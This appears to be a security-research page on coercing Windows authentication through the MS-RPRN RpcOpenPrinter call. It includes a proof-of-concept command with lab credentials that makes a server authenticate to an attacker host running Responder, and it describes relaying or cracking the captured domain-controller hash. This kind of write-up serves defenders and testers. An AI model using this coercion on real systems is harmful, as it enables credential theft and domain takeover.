# MS-RPRN - Remote call to RpcOpenPrinter (opnum 1)

## Summary

 - **Protocol**: [[MS-RPRN]: Print System Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1)

 - **Protocol UUID**: 12345678-1234-abcd-ef00-0123456789ab

 - **Protocol version**: 1.0

 - **Function name**: [`RpcOpenPrinter`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f)

 - **Function operation number**: `1`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine.

Then we need to connect to the remote SMB pipe `\PIPE\spoolss` and bind to (uuid `12345678-1234-abcd-ef00-0123456789ab`, version `1.0`) in order to perform calls to RPC functions of the `MS-RPRN` protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\spoolss`. This pipe is connected to the protocol [[MS-RPRN]: Print System Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) and allows to call RPC functions of this protocol. It will then call the remote [`RpcOpenPrinter`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f) function on the Windows Server (192.168.2.1) with the following parameters:

```cpp
RpcOpenPrinter('192.168.2.51\x00', 'test\x00', 1)
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\NETLOGON` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to ohter services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!

---

## Function technical detail

```cpp
DWORD RpcOpenPrinter(
    [in, string, unique] STRING_HANDLE pPrinterName,
    [out] PRINTER_HANDLE* pHandle,
    [in, string, unique] wchar_t* pDatatype,
    [in] DEVMODE_CONTAINER* pDevModeContainer,
    [in] DWORD AccessRequired
);
```

 - **pPrinterName**: A `STRING_HANDLE` (section 2.2.1.1.7) for a printer connection, printer object, server object, job object, port object, or port monitor object. For opening a server object, this parameter MUST adhere to the specification in Print Server Name Parameters (section 3.1.4.1.4); for opening all other objects, it MUST adhere to the specification in Printer Name Parameters (section 3.1.4.1.5).


 - **pHandle**: A pointer to a `PRINTER_HANDLE` (section 2.2.1.1.4) that MUST receive the RPC context handle [C706] to the object identified by the `pPrinterName` parameter.


 - **pDatatype**: A pointer to a string that specifies the data type to be associated with the printer handle. This parameter MUST adhere to the specification in Datatype Name Parameters (section 3.1.4.1.1).


 - **pDevModeContainer**: A pointer to a `DEVMODE_CONTAINER` structure. This parameter MUST adhere to the specification in `DEVMODE_CONTAINER` Parameters (section 3.1.4.1.8.1).


 - **AccessRequired**: The access level that the client requires for interacting with the object to which a handle is being opened. The value of this parameter is one of those specified in Access Values (section 2.2.3.1) or 0. For rules governing access values, see section 2.2.4.1. If `AccessRequired` is set to 0 (if no specific access level is requested), the server MUST assume a `GENERIC_READ` (section 2.2.3.1) access level.

## References

 - Documentation of protocol [MS-RPRN]: Print System Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1

 - Documentation of function `RpcOpenPrinter`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f